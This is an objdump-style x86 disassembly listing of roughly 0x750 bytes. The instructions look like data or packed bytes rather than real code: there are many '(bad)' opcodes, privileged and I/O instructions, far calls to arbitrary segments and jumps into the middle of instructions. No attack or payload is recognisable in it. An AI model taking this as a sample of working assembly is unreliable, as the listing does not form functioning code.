  43ef52:	push   ds
  43ef53:	sbb    BYTE PTR [esi-0x15bf81fe],bl
  43ef59:	push   ss
  43ef5a:	push   ss
  43ef5b:	xchg   ecx,eax
  43ef5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ef5d:	pusha  
  43ef5e:	mov    ds:0x263aabc0,eax
  43ef63:	push   ds
  43ef64:	push   edi
  43ef65:	jb     0x43ef36
  43ef67:	mov    eax,0x6c0c1d16
  43ef6c:	ss test al,0x1c
  43ef6f:	and    bl,BYTE PTR [ebp+0x65]
  43ef72:	fisub  DWORD PTR [eax-0x5dba556c]
  43ef78:	sub    ch,BYTE PTR [edx+0x5b46076a]
  43ef7e:	push   ds
  43ef7f:	or     bl,al
  43ef81:	push   0xffffffe9
  43ef83:	mov    dh,0x93
  43ef85:	xor    al,0x8
  43ef87:	pop    ecx
  43ef88:	mov    edi,0x18d42c4c
  43ef8d:	cmp    DWORD PTR [eax-0x53],0xffffffa1
  43ef91:	inc    ecx
  43ef92:	xor    al,0x58
  43ef94:	dec    ebx
  43ef95:	push   ds
  43ef96:	cmp    al,0x40
  43ef98:	push   0x5e1a943d
  43ef9d:	sub    eax,0x8ac521d0
  43efa2:	and    al,0x32
  43efa4:	jno    0x43effc
  43efa6:	jne    0x43f008
  43efa8:	dec    edx
  43efa9:	inc    edx
  43efaa:	nop
  43efab:	push   0xffffffba
  43efad:	sbb    al,BYTE PTR [edi+esi*1-0x2]
  43efb1:	bswap  ebp
  43efb3:	mov    WORD PTR [edi+0x4c3a1eb0],ds
  43efb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43efba:	jb     0x43efa3
  43efbc:	ins    BYTE PTR es:[edi],dx
  43efbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43efbe:	daa    
  43efbf:	pop    ecx
  43efc0:	movd   mm1,DWORD PTR ds:0xb3229e49
  43efc7:	cs enter 0x220a,0xf0
  43efcc:	les    esp,FWORD PTR [edx+0x627cacc0]
  43efd2:	and    DWORD PTR [eax+0x57],0x41
  43efd6:	sub    al,0x30
  43efd8:	or     BYTE PTR [esi],al
  43efda:	enter  0xb5d8,0xed
  43efde:	rcl    dh,1
  43efe0:	and    esi,DWORD PTR [edx]
  43efe2:	jb     0x43ef6a
  43efe4:	pusha  
  43efe5:	add    esi,esp
  43efe7:	hlt    
  43efe8:	add    edi,DWORD PTR [esp+eax*1]
  43efeb:	ins    BYTE PTR es:[edi],dx
  43efec:	inc    esi
  43efed:	pop    esi
  43efee:	dec    edi
  43efef:	enter  0x5fa,0x22
  43eff3:	rcr    edx,0x5d
  43eff6:	loop   0x43efda
  43eff8:	add    eax,0x8e1ea8ee
  43effd:	inc    ecx
  43effe:	test   eax,0x661668c0
  43f003:	mov    al,0x72
  43f005:	test   BYTE PTR [edx-0x25938e55],ah
  43f00b:	push   cs
  43f00c:	stos   DWORD PTR es:[edi],eax
  43f00d:	add    BYTE PTR [edi],bh
  43f00f:	into   
  43f010:	sti    
  43f011:	mov    dh,0x54
  43f013:	and    al,0x1
  43f015:	(bad)  
  43f016:	fcmovbe st,st(0)
  43f018:	add    eax,DWORD PTR [ebp+0x44547828]
  43f01e:	adc    al,BYTE PTR [edx+0x524bc544]
  43f024:	jmp    DWORD PTR [eax+0x30]
  43f027:	sbb    DWORD PTR [eax],esi
  43f029:	add    BYTE PTR [ecx-0x7ecf09ba],ch
  43f02f:	push   edi
  43f030:	aam    0xa6
  43f032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f033:	cwde   
  43f034:	mov    eax,0x2a52a13c
  43f039:	cmp    bl,BYTE PTR [eax-0x2b847970]
  43f03f:	push   ds
  43f040:	sbb    al,0x99
  43f042:	jp     0x43f0a4
  43f044:	repnz cmp al,0x7
  43f047:	jp     0x43efe6
  43f049:	add    BYTE PTR cs:0x1e1eb26e,0xf0
  43f051:	ins    BYTE PTR es:[edi],dx
  43f052:	or     cl,BYTE PTR [edx]
  43f054:	call   0x2426:0x5bb2d829
  43f05b:	in     eax,0x3a
  43f05d:	or     ch,BYTE PTR [edx]
  43f05f:	mov    BYTE PTR [ecx-0x52f17fe],ah
  43f065:	or     BYTE PTR [eax+ebx*2],ch
  43f068:	cmp    al,0x47
  43f06a:	inc    edi
  43f06b:	lds    esi,FWORD PTR ds:0x4728bf9a
  43f071:	jle    0x43f099
  43f073:	dec    eax
  43f074:	xor    al,0x80
  43f076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f077:	imul   esi,ebx,0xfbc0d060
  43f07d:	and    DWORD PTR [eax+0x4d767ac3],esp
  43f083:	adc    BYTE PTR [eax+0xf6a133c],bl
  43f089:	adc    BYTE PTR [ebx+0x563d8e75],bh
  43f08f:	out    0x49,eax
  43f091:	shld   DWORD PTR [edx],esp,0x0
  43f095:	and    eax,esi
  43f097:	xchg   esp,eax
  43f098:	sub    DWORD PTR [bx+di+0x34],esp
  43f09c:	sbb    al,0xc2
  43f09e:	pop    edi
  43f09f:	push   esi
  43f0a0:	jg     0x43f0a4
  43f0a2:	adc    al,0xb5
  43f0a4:	mov    DWORD PTR [eax+0x4e],ecx
  43f0a7:	pop    eax
  43f0a8:	les    esp,FWORD PTR [esi+edx*4+0x49]
  43f0ac:	adc    bh,BYTE PTR [ebp-0x4a]
  43f0af:	ficom  WORD PTR [eax-0x14]
  43f0b2:	sbb    al,0xb0
  43f0b4:	jge    0x43f109
  43f0b6:	adc    eax,0x358cf9ce
  43f0bb:	pop    esi
  43f0bc:	ret    0x5179
  43f0bf:	adc    ecx,DWORD PTR [eax]
  43f0c1:	push   esi
  43f0c2:	jmp    0xe004:0x1c344c5e
  43f0c9:	das    
  43f0ca:	inc    eax
  43f0cb:	pop    ebx
  43f0cc:	inc    edi
  43f0cd:	dec    eax
  43f0ce:	pop    edx
  43f0cf:	mov    edx,0x1cd9ec58
  43f0d4:	push   ecx
  43f0d5:	ins    DWORD PTR es:[edi],dx
  43f0d6:	mov    ecx,0xe068868d
  43f0db:	jl     0x43f07b
  43f0dd:	popa   
  43f0de:	jl     0x43f0f2
  43f0e0:	inc    eax
  43f0e1:	leave  
  43f0e2:	mov    ebx,0x134b5d02
  43f0e7:	test   al,0xa4
  43f0e9:	and    ch,BYTE PTR [esi]
  43f0eb:	mov    es,edi
  43f0ed:	inc    edx
  43f0ee:	shl    DWORD PTR [esi+0x32b352dd],0xcc
  43f0f5:	(bad)  
  43f0f6:	fs push ss
  43f0f8:	aam    0xb8
  43f0fa:	add    BYTE PTR [ecx+0x4473d676],0x4c
  43f101:	and    al,BYTE PTR [esi+eax*1+0x4b63ee52]
  43f108:	int    0x32
  43f10a:	or     ch,BYTE PTR [ebx-0x72]
  43f10d:	push   es
  43f10e:	sahf   
  43f10f:	adc    al,0xb6
  43f111:	outs   dx,DWORD PTR ds:[esi]
  43f112:	call   0x28b0:0x9276c2e3
  43f119:	sub    BYTE PTR [eax+0x28bf0c62],dh
  43f11f:	rol    esi,1
  43f121:	(bad)  
  43f122:	loopne 0x43f190
  43f124:	push   cs
  43f125:	test   DWORD PTR [edx],ecx
  43f127:	sub    BYTE PTR [eax-0x57],bh
  43f12a:	arpl   bx,bp
  43f12c:	hlt    
  43f12d:	add    BYTE PTR [edi+0x107347fc],bl
  43f133:	mov    al,0x61
  43f135:	xchg   esi,eax
  43f136:	js     0x43f17c
  43f138:	xchg   ebx,eax
  43f139:	je     0x43f17f
  43f13b:	mov    eax,0x3d9d2e04
  43f140:	test   ah,dh
  43f142:	cwde   
  43f143:	sub    al,0x8f
  43f145:	(bad)  
  43f146:	sahf   
  43f147:	xor    BYTE PTR [esi-0x36],dl
  43f14a:	jp     0x43f159
  43f14c:	mov    al,ds:0x371c959a
  43f151:	push   esp
  43f152:	push   0x867da2aa
  43f157:	cmp    DWORD PTR [eax+0x4d06a6d4],ecx
  43f15d:	dec    edi
  43f15e:	adc    BYTE PTR [eax-0x24],0x55
  43f162:	push   edx
  43f163:	sub    BYTE PTR [esp+ebp*2+0x45ad7852],0x44
  43f16b:	xchg   esp,eax
  43f16c:	dec    edi
  43f16d:	xor    al,0xd7
  43f16f:	or     DWORD PTR [ecx+edi*1+0x617c7c65],esi
  43f176:	nop
  43f177:	out    dx,al
  43f178:	sub    al,0x66
  43f17a:	adc    BYTE PTR [ecx+esi*4+0x14],ch
  43f17e:	fimul  WORD PTR [edx]
  43f180:	push   esp
  43f181:	imul   esp,DWORD PTR [edx-0xc],0x430a1091
  43f188:	les    eax,FWORD PTR [edi-0x459cfd30]
  43f18e:	ds ja  0x43f1ab
  43f191:	(bad)  
  43f192:	xlat   BYTE PTR ds:[ebx]
  43f193:	add    esp,DWORD PTR [eax+0x45]
  43f196:	imul   eax,DWORD PTR [eax-0x7],0xffffff88
  43f19a:	mov    ds:0x32f0525e,eax
  43f19f:	xchg   ebx,eax
  43f1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f1a1:	paddq  mm3,QWORD PTR [edi]
  43f1a4:	es (bad) 
  43f1a6:	pushf  
  43f1a7:	pushf  
  43f1a8:	enter  0x67b5,0x50
  43f1ac:	fistp  DWORD PTR [edi]
  43f1ae:	mov    esi,0x126e170b
  43f1b3:	push   edx
  43f1b4:	sahf   
  43f1b5:	ins    DWORD PTR es:[edi],dx
  43f1b6:	(bad)  
  43f1b7:	and    dl,BYTE PTR [esi]
  43f1b9:	and    BYTE PTR [ebp-0x35583906],ah
  43f1bf:	push   ss
  43f1c0:	cmp    DWORD PTR [ebp+0x26],esp
  43f1c3:	mov    esi,0xf2b31628
  43f1c8:	mov    bh,0x85
  43f1ca:	adc    BYTE PTR [esi+0x36],0x3b
  43f1ce:	cs and al,0x2a
  43f1d1:	dec    esp
  43f1d2:	add    ah,BYTE PTR [ecx]
  43f1d4:	test   al,0xbe
  43f1d6:	pop    ecx
  43f1d7:	(bad)  
  43f1d8:	push   ss
  43f1d9:	jo     0x43f22b
  43f1db:	lods   al,BYTE PTR ds:[esi]
  43f1dc:	add    cl,ch
  43f1de:	fild   DWORD PTR [esi]
  43f1e0:	add    eax,0x86ba3207
  43f1e5:	(bad)  
  43f1e7:	popf   
  43f1e8:	mov    dh,al
  43f1ea:	loop   0x43f19d
  43f1ec:	lods   eax,DWORD PTR ds:[esi]
  43f1ed:	adc    eax,0xf2463c16
  43f1f2:	inc    esp
  43f1f3:	les    ebp,FWORD PTR [edx+0x26]
  43f1f6:	jne    0x43f205
  43f1f8:	or     BYTE PTR [eax],bl
  43f1fa:	pop    edx
  43f1fb:	and    BYTE PTR [ebp+0x1a5f4d45],ah
  43f201:	inc    esi
  43f202:	inc    esi
  43f203:	(bad)  
  43f204:	sbb    bh,BYTE PTR [edi]
  43f206:	inc    eax
  43f207:	loop   0x43f191
  43f209:	shl    BYTE PTR [esi+0x78],0x6e
  43f20d:	mov    al,ds:0x83c6d8c5
  43f212:	or     al,0xe1
  43f214:	xchg   DWORD PTR [edx+eiz*8+0x6c3062d4],esi
  43f21b:	and    eax,0x3d9335b5
  43f220:	ins    BYTE PTR es:[edi],dx
  43f221:	mov    ds:0xbed828ca,al
  43f226:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  43f228:	inc    esp
  43f229:	or     bl,bl
  43f22b:	and    ebp,DWORD PTR [eax+eax*8]
  43f22e:	add    al,0x10
  43f230:	(bad)  
  43f231:	push   ss
  43f232:	jl     0x43f28d
  43f234:	jp     0x43f27e
  43f236:	in     eax,0x65
  43f238:	mov    ah,0x59
  43f23a:	mov    dh,BYTE PTR [esp+ebx*1]
  43f23d:	push   0x1c240f68
  43f242:	xor    BYTE PTR fs:[ebx+0x1f19f650],0x68
  43f24a:	ins    BYTE PTR es:[edi],dx
  43f24b:	cwde   
  43f24c:	xchg   edi,eax
  43f24d:	cmp    al,0xc6
  43f24f:	sbb    al,0xd2
  43f251:	ins    DWORD PTR es:[edi],dx
  43f252:	jge    0x43f204
  43f254:	lock mov ch,BYTE PTR [edx]
  43f257:	aas    
  43f258:	inc    esi
  43f259:	and    DWORD PTR [esi+0x71a41e3a],edx
  43f25f:	loopne 0x43f2de
  43f261:	jl     0x43f293
  43f263:	push   es
  43f264:	push   0xaa9675a1
  43f269:	mov    al,0x17
  43f26b:	mov    cl,0x26
  43f26d:	push   ds
  43f26e:	ror    BYTE PTR [edi],cl
  43f270:	sub    BYTE PTR [ebp-0x61],dl
  43f273:	fmul   DWORD PTR [edx]
  43f275:	lahf   
  43f276:	or     al,0x2c
  43f278:	push   ds
  43f279:	or     eax,0xc703ee6d
  43f27e:	push   edi
  43f27f:	adc    al,0xda
  43f281:	sub    esi,DWORD PTR [esi]
  43f283:	or     al,0xf0
  43f285:	pop    eax
  43f286:	dec    edi
  43f287:	ins    BYTE PTR es:[edi],dx
  43f288:	hlt    
  43f289:	add    eax,0x32455a02
  43f28e:	clc    
  43f28f:	sbb    BYTE PTR [eax],dh
  43f291:	cmc    
  43f292:	ficom  DWORD PTR [edi]
  43f294:	sbb    BYTE PTR [ebp-0x1a],0xce
  43f298:	cmc    
  43f299:	xchg   edx,eax
  43f29a:	sbb    DWORD PTR [eax],ebp
  43f29c:	loope  0x43f275
  43f29e:	mov    cl,BYTE PTR [edx]
  43f2a0:	and    DWORD PTR [eax+esi*2+0x5b],ebx
  43f2a4:	inc    eax
  43f2a5:	fistp  WORD PTR [ecx-0x7cfd7650]
  43f2ab:	or     BYTE PTR [edx+ebp*1-0x5b],al
  43f2af:	or     BYTE PTR [edi+0x4],0x1a
  43f2b3:	ss xor dl,0xd2
  43f2b7:	out    0x4b,eax
  43f2b9:	push   0xcad6b43b
  43f2be:	(bad)  
  43f2bf:	(bad)  
  43f2c0:	outs   dx,BYTE PTR ds:[esi]
  43f2c1:	pop    edx
  43f2c2:	mov    cs,WORD PTR [ecx-0x683e2931]
  43f2c8:	pushf  
  43f2c9:	push   0x58cda839
  43f2ce:	pusha  
  43f2cf:	adc    ah,0xdc
  43f2d2:	repz fadd st,st(0)
  43f2d5:	pop    ecx
  43f2d6:	fbstp  TBYTE PTR [esp+esi*1]
  43f2d9:	jge    0x43f2a4
  43f2db:	mov    BYTE PTR ds:0x2f5629ac,dl
  43f2e1:	pusha  
  43f2e2:	lds    esi,FWORD PTR [ebx]
  43f2e4:	jbe    0x43f34c
  43f2e6:	xor    DWORD PTR [ebp+0xd587290],0xffffff8c
  43f2ed:	(bad)  
  43f2ee:	and    al,0x56
  43f2f0:	pop    esp
  43f2f1:	and    BYTE PTR [esp+eiz*2-0x441fe047],al
  43f2f8:	fcmovbe st,st(6)
  43f2fa:	daa    
  43f2fb:	mov    DWORD PTR [ebp-0x7daceac],esi
  43f301:	pusha  
  43f302:	mov    al,ds:0xf82c55ea
  43f307:	test   esp,edi
  43f309:	add    al,0x16
  43f30b:	mov    DWORD PTR [eax-0x2e],edx
  43f30e:	hlt    
  43f30f:	adc    bl,BYTE PTR [edi+ebp*4-0x3b]
  43f313:	dec    edx
  43f314:	push   ecx
  43f315:	test   BYTE PTR [ebx+0x70e15526],0x46
  43f31c:	(bad)  
  43f31d:	sub    ah,BYTE PTR [eax-0x74]
  43f320:	cmc    
  43f321:	sbb    dl,BYTE PTR fs:[eax]
  43f324:	xchg   ebp,eax
  43f325:	ret    
  43f326:	xor    ebp,esi
  43f328:	leave  
  43f329:	jl     0x43f2c7
  43f32b:	sti    
  43f32c:	out    0xc7,al
  43f32e:	adc    al,0x89
  43f330:	test   al,0x94
  43f332:	ins    BYTE PTR es:[edi],dx
  43f333:	push   ss
  43f334:	in     eax,0x64
  43f336:	push   0x48f6b35
  43f33b:	push   ds
  43f33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f33d:	out    dx,al
  43f33e:	sub    DWORD PTR [eax-0x19],esi
  43f341:	or     cl,BYTE PTR [eax+eiz*4]
  43f344:	mov    cl,BYTE PTR [edx-0x5336a566]
  43f34a:	mov    al,ds:0x8920f2be
  43f34f:	push   0xcd50783e
  43f354:	mov    ah,0x74
  43f356:	stc    
  43f357:	xchg   BYTE PTR [eax],ch
  43f359:	sub    BYTE PTR [eax],bh
  43f35b:	nop
  43f35c:	lods   al,BYTE PTR ds:[esi]
  43f35d:	sbb    BYTE PTR ds:0xac452cba,ch
  43f363:	adc    BYTE PTR [ecx+0x4f14c88],dl
  43f369:	add    DWORD PTR [eax+0x6],ebp
  43f36c:	cmc    
  43f36d:	xchg   edx,eax
  43f36e:	test   al,0xe6
  43f370:	mov    bh,0x68
  43f372:	inc    eax
  43f373:	mov    ah,0x1d
  43f375:	out    0x79,al
  43f377:	xchg   esp,eax
  43f378:	cmp    al,0x31
  43f37a:	add    al,al
  43f37c:	popa   
  43f37d:	(bad)  
  43f37e:	push   esp
  43f37f:	mov    esi,0xb81ab0fb
  43f384:	call   0xae6c39b
  43f389:	xchg   ecx,eax
  43f38a:	(bad)  
  43f38b:	jp     0x43f3c1
  43f38d:	jnp    0x43f36f
  43f38f:	fdiv   st(0),st
  43f391:	cmp    BYTE PTR [ebp+esi*8+0x38b222cb],ah
  43f398:	loop   0x43f379
  43f39a:	add    DWORD PTR ds:0x182e9a34,ecx
  43f3a0:	pop    esp
  43f3a1:	or     bl,bh
  43f3a3:	or     edx,esp
  43f3a5:	aas    
  43f3a6:	mov    dl,0x9e
  43f3a8:	or     ah,BYTE PTR [ecx]
  43f3aa:	jo     0x43f359
  43f3ac:	dec    edi
  43f3ad:	inc    esi
  43f3ae:	add    edx,DWORD PTR [eax+0x141a5489]
  43f3b4:	jo     0x43f41f
  43f3b6:	loope  0x43f3eb
  43f3b8:	xor    al,BYTE PTR [eax+0x33d152f9]
  43f3be:	rcr    DWORD PTR [edx-0x49],0x16
  43f3c2:	test   BYTE PTR [eax-0x5f1cbb3],bh
  43f3c8:	mov    al,gs:0x6c1c46d8
  43f3ce:	fwait
  43f3cf:	cmc    
  43f3d0:	or     DWORD PTR [ecx],eax
  43f3d2:	lahf   
  43f3d3:	sbb    dh,BYTE PTR [ecx]
  43f3d5:	and    bl,BYTE PTR [esi+0x7f]
  43f3d8:	dec    ecx
  43f3d9:	pop    edx
  43f3da:	pusha  
  43f3db:	ss pop esp
  43f3dd:	pushf  
  43f3de:	(bad)  
  43f3df:	mov    dh,0x68
  43f3e1:	mov    ah,0x6e
  43f3e3:	cmp    al,0x58
  43f3e5:	or     ch,BYTE PTR [esp+eax*1+0x6fa53fca]
  43f3ec:	push   eax
  43f3ed:	scas   eax,DWORD PTR es:[edi]
  43f3ee:	call   0x521cd91c
  43f3f3:	mov    eax,0xf8291624
  43f3f8:	pop    esp
  43f3f9:	mov    dh,0x3e
  43f3fb:	(bad)  
  43f3fc:	out    0x27,al
  43f3fe:	call   0xf454:0x40d6a852
  43f405:	and    esp,ebp
  43f407:	jmp    0xb1e8:0x35a1053
  43f40e:	test   al,0x27
  43f410:	cld    
  43f411:	xor    al,0xd0
  43f413:	sub    eax,0x4458e6f2
  43f418:	mov    esi,0x30086aa6
  43f41d:	out    0xd0,al
  43f41f:	dec    eax
  43f420:	push   ss
  43f421:	pop    eax
  43f422:	loope  0x43f427
  43f424:	lods   al,BYTE PTR ds:[esi]
  43f425:	mov    al,0x46
  43f427:	sub    eax,0x164f222f
  43f42c:	jbe    0x43f3af
  43f42e:	ins    BYTE PTR es:[edi],dx
  43f42f:	adc    ah,BYTE PTR [ebp+0xd6a0a24]
  43f435:	adc    BYTE PTR ds:0x6cf38016,0x98
  43f43c:	ret    
  43f43d:	fs pop ds
  43f43f:	mov    DWORD PTR [esi+0x614a2fe6],ecx
  43f445:	fiadd  WORD PTR [eax]
  43f447:	shl    DWORD PTR [ebx],cl
  43f449:	add    cl,dl
  43f44b:	mov    al,ds:0x81c26ea8
  43f450:	mov    al,0x39
  43f452:	mov    eax,0xe20c17f4
  43f457:	and    al,0x1d
  43f459:	fstp   DWORD PTR [edx-0x1f]
  43f45c:	or     al,0x22
  43f45e:	test   BYTE PTR [esi-0x29b6212],dh
  43f464:	push   ss
  43f465:	mov    cl,0xb2
  43f467:	scas   al,BYTE PTR es:[edi]
  43f468:	adc    ah,BYTE PTR [edx-0x2fab3db5]
  43f46e:	sub    cl,BYTE PTR [esi]
  43f470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f471:	mov    dh,0xb2
  43f473:	cli    
  43f474:	or     dl,dh
  43f476:	cmp    al,0x8
  43f478:	in     eax,dx
  43f479:	ret    0x5158
  43f47c:	(bad)  
  43f47d:	pop    esp
  43f47e:	loop   0x43f4c5
  43f480:	pop    edx
  43f481:	mov    ds:0xc22b9a21,al
  43f486:	mov    cl,0x81
  43f488:	or     eax,0x66b0c9d4
  43f48d:	push   es
  43f48e:	or     ebx,DWORD PTR [ebx+0x2c5e5544]
  43f494:	push   eax
  43f495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f496:	push   eax
  43f497:	add    cl,cl
  43f499:	or     edx,eax
  43f49b:	das    
  43f49c:	sar    BYTE PTR fs:[ecx+ebp*1+0x50],cl
  43f4a1:	mov    bl,0x56
  43f4a3:	popa   
  43f4a4:	xor    dh,dl
  43f4a6:	sbb    al,0x15
  43f4a8:	push   edx
  43f4a9:	add    al,0x8b
  43f4ab:	test   ch,cl
  43f4ad:	int3   
  43f4ae:	popa   
  43f4af:	in     al,dx
  43f4b0:	pushf  
  43f4b1:	cmp    BYTE PTR [esi],ch
  43f4b3:	inc    esi
  43f4b4:	sbb    ah,bl
  43f4b6:	mov    dh,0x66
  43f4b8:	in     eax,dx
  43f4b9:	add    DWORD PTR [eax+0x2e],edx
  43f4bc:	aas    
  43f4bd:	mov    esi,0xb64ca687
  43f4c2:	xor    al,0xc3
  43f4c4:	icebp  
  43f4c5:	rol    BYTE PTR [esp+esi*1],1
  43f4c8:	sub    BYTE PTR [eax],ch
  43f4ca:	jp     0x43f50b
  43f4cc:	ss sahf 
  43f4ce:	ret    0x1143
  43f4d1:	das    
  43f4d2:	outs   dx,BYTE PTR ds:[esi]
  43f4d3:	adc    al,0xaa
  43f4d5:	fadd   QWORD PTR [ebx+0x6d]
  43f4d8:	mov    eax,0x6a0a5d68
  43f4dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f4de:	adc    al,0xa1
  43f4e0:	test   al,0x6e
  43f4e2:	je     0x43f526
  43f4e4:	cmp    al,0x58
  43f4e6:	mov    edx,edx
  43f4e8:	inc    ebx
  43f4e9:	sbb    ch,bl
  43f4eb:	shl    BYTE PTR [edi-0x15c5655e],cl
  43f4f1:	enter  0x8ed6,0xa9
  43f4f5:	xor    dl,cl
  43f4f7:	xor    al,0x28
  43f4f9:	xchg   edx,eax
  43f4fa:	or     BYTE PTR [edx+edx*2],dh
  43f4fd:	sub    dl,ah
  43f4ff:	mov    esp,0xe06d3f31
  43f504:	mov    eax,ds:0x5c9081aa
  43f509:	in     al,0xf2
  43f50b:	push   esi
  43f50c:	aad    0xd3
  43f50e:	inc    eax
  43f50f:	mov    al,BYTE PTR [edx+esi*2]
  43f512:	sub    bl,BYTE PTR [edi-0x30]
  43f515:	dec    edi
  43f516:	test   al,0x53
  43f518:	cmp    cl,bh
  43f51a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f51b:	sub    BYTE PTR [ebp-0x3c0b4b85],ch
  43f521:	push   cs
  43f522:	push   ebx
  43f523:	xor    dh,ah
  43f525:	in     eax,0xf4
  43f527:	dec    esp
  43f528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f529:	dec    esp
  43f52a:	ins    DWORD PTR es:[edi],dx
  43f52b:	fcomp  DWORD PTR [edx]
  43f52d:	add    al,0xef
  43f52f:	ficom  DWORD PTR [eax]
  43f531:	mov    ch,0x1d
  43f533:	xchg   edi,eax
  43f534:	fidivr DWORD PTR [esp+ebx*2-0xd]
  43f538:	inc    BYTE PTR [ebx-0x46]
  43f53b:	push   eax
  43f53c:	pop    ebx
  43f53d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f53e:	fimul  WORD PTR [ecx+0xaa85c2d]
  43f544:	jae    0x43f568
  43f546:	jg     0x43f580
  43f548:	aas    
  43f549:	mov    al,ds:0x68d0a94e
  43f54e:	inc    esi
  43f54f:	and    eax,0x518e278e
  43f554:	sub    dl,BYTE PTR [esi]
  43f556:	pusha  
  43f557:	jo     0x43f4d9
  43f559:	xchg   ebp,eax
  43f55a:	lock dec ebx
  43f55c:	push   es
  43f55d:	push   ds
  43f55e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f55f:	or     DWORD PTR [edx+0x3e],ebx
  43f562:	ins    DWORD PTR es:[edi],dx
  43f563:	lock arpl WORD PTR [ebp-0x29],ax
  43f567:	xchg   ebx,eax
  43f568:	outs   dx,BYTE PTR ds:[esi]
  43f569:	add    DWORD PTR [ebp+ebp*4-0x36],ebx
  43f56d:	mov    eax,0x7a0b5dfd
  43f572:	or     DWORD PTR [edx-0x843df5e],edx
  43f578:	adc    ecx,DWORD PTR [edi]
  43f57a:	nop
  43f57b:	mov    al,0x4
  43f57d:	imul   ebx,DWORD PTR [edi+0x28],0xffffffe6
  43f581:	adc    ecx,DWORD PTR [edi+0x679e26ad]
  43f587:	cli    
  43f588:	lock sahf 
  43f58a:	add    esi,DWORD PTR ds:0x5bd60fc2
  43f590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f591:	dec    eax
  43f592:	mov    al,ds:0x575b592f
  43f597:	in     al,dx
  43f598:	push   0xb76034db
  43f59d:	add    al,al
  43f59f:	jp     0x43f533
  43f5a1:	mov    dh,0x70
  43f5a3:	mov    esi,0x2e52eb8c
  43f5a8:	(bad)  
  43f5a9:	add    DWORD PTR [ecx],0x34
  43f5ac:	call   0xd891:0x7d16249c
  43f5b3:	fsub   QWORD PTR [eax-0x7185dc72]
  43f5b9:	cli    
  43f5ba:	popa   
  43f5bb:	jae    0x43f5d7
  43f5bd:	mov    dh,0xd6
  43f5bf:	or     al,0xbb
  43f5c1:	push   ss
  43f5c2:	test   BYTE PTR [eax+0x72],dh
  43f5c5:	ret    
  43f5c6:	cmc    
  43f5c7:	adc    al,al
  43f5c9:	add    edi,DWORD PTR [esi+eax*4-0x2b]
  43f5cd:	sub    BYTE PTR [eax],bh
  43f5cf:	stc    
  43f5d0:	add    al,0x61
  43f5d2:	cmp    esp,DWORD PTR [esi]
  43f5d4:	inc    eax
  43f5d5:	daa    
  43f5d6:	cs loop 0x43f5a0
  43f5d9:	adc    BYTE PTR [esi],bh
  43f5db:	or     DWORD PTR [eax-0x24],edi
  43f5de:	fdiv   DWORD PTR [edx]
  43f5e0:	mov    ah,0xdd
  43f5e2:	adc    eax,0x5af11f5b
  43f5e7:	js     0x43f5ad
  43f5e9:	cli    
  43f5ea:	jl     0x43f638
  43f5ec:	or     al,0x82
  43f5ee:	pinsrw mm0,WORD PTR [ebx+0x72],0x98
  43f5f3:	xlat   BYTE PTR ds:[ebx]
  43f5f4:	pop    esp
  43f5f5:	aaa    
  43f5f6:	jne    0x43f59a
  43f5f8:	add    ebp,ecx
  43f5fa:	mov    bl,0x84
  43f5fc:	sbb    esi,eax
  43f5fe:	mov    fs:0x8a82b466,eax
  43f604:	xchg   BYTE PTR [ebx+0x4a],al
  43f607:	pop    ebx
  43f608:	mov    esi,0x46cefc3d
  43f60d:	xor    al,0x85
  43f60f:	pop    edi
  43f610:	and    al,0x76
  43f612:	mov    ch,cl
  43f614:	mov    ah,0x3a
  43f616:	cdq    
  43f617:	(bad)  
  43f618:	push   eax
  43f619:	inc    eax
  43f61a:	shl    DWORD PTR [ebx+0x70266bc2],1
  43f620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f621:	push   cs
  43f622:	dec    ecx
  43f623:	mov    al,ds:0x7d945b96
  43f628:	xchg   edx,eax
  43f629:	xchg   ebp,eax
  43f62a:	add    al,0x97
  43f62c:	and    eax,0xe904b848
  43f631:	fadd   DWORD PTR [edx-0x25]
  43f634:	dec    edx
  43f635:	add    eax,0xd1823b5b
  43f63a:	out    0x4e,al
  43f63c:	enter  0xf443,0x58
  43f640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f641:	retf   0x22cf
  43f644:	push   esi
  43f645:	mov    ch,0x66
  43f647:	mov    BYTE PTR [esi+0x361b8270],bh
  43f64d:	loop   0x43f611
  43f64f:	sbb    BYTE PTR [edx-0x42bfb0f7],0x80
  43f656:	xor    al,0x6e
  43f658:	sub    BYTE PTR [edi],0x59
  43f65b:	pop    ebp
  43f65c:	dec    esi
  43f65d:	es test al,0xa
  43f660:	in     al,0xa8
  43f662:	in     eax,dx
  43f663:	dec    ebx
  43f664:	(bad)  
  43f665:	repnz push ss
  43f667:	pushf  
  43f668:	push   ss
  43f669:	cmp    cl,BYTE PTR [esp+ecx*2]
  43f66c:	pusha  
  43f66d:	ins    DWORD PTR es:[edi],dx
  43f66e:	lds    eax,FWORD PTR [ebx]
  43f670:	ds cld 
  43f672:	add    al,0xd2
  43f674:	or     eax,0xd2229d28
  43f679:	jb     0x43f68d
  43f67b:	fdiv   DWORD PTR [esp+ebp*2-0x2]
  43f67f:	lods   al,BYTE PTR ds:[esi]
  43f680:	test   eax,0x3ce9b615
  43f685:	push   esi
  43f686:	loop   0x43f6c9
  43f688:	dec    ebp
  43f689:	cmp    dl,al
  43f68b:	mov    eax,0xe04c78a5
  43f690:	and    eax,0x34d83ca2
  43f695:	mov    ds:0xe2044d93,al
  43f69a:	add    DWORD PTR [esi+0x14],eax
  43f69d:	sbb    al,dl
  43f69f:	fbld   TBYTE PTR [ebp-0x17]
  43f6a2:	mov    ds:0xd704d389,eax
